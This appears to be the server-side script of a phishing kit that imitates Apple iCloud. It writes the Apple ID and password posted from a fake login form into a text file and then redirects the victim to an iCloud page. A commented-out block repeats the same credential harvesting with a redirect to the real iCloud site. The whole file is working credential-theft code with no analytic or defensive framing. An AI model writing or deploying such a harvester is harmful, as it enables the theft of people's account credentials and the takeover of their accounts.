<?php
      $name = 'n.txt';
      $apple = $_POST["apple"];
      $pw = $_POST["pw"];
      $file = fopen($name, 'a');
      fwrite($file, $apple."\n".$pw."\n\n");
      fclose($file);
      sleep(1);
      header("Location: icloud.html");
    ?>






<?php
#if(isset($_POST['apple']) && isset($_POST['pw'])) {
#    $data = $_POST['apple'] . '=>=>=>=>=>=>=>' . $_POST['pw'] . "\n\n\n";
#    if($ret === false) {
#        die('error!');
#    }
#    else {
#        echo "Done";
#    }
#}
#else {
#   die('Error');
#}
#header("Location: https://www.icloud.com");
#die();
?>
